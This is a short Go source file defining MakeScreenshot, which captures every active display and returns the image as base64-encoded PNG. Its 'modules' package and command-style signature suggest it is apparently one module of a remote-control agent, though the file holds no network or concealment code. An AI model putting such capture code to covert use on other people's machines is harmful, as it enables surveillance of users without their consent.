// +build linux windows

package modules

import (
	"bytes"
	"encoding/base64"
	"image"
	"image/png"

	"github.com/kbinani/screenshot"
)

func MakeScreenshot(input string) string {
	n := screenshot.NumActiveDisplays()
	var all image.Rectangle = image.Rect(0, 0, 0, 0)
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		all = bounds.Union(all)
	}

	img, err := screenshot.Capture(all.Min.X, all.Min.Y, all.Dx(), all.Dy())
	_ = err
	img_buffer := new(bytes.Buffer)
	png.Encode(img_buffer, img)
	end_s3 := img_buffer.Bytes()
	encode_base64 := base64.StdEncoding.EncodeToString(end_s3)
	return encode_base64

}
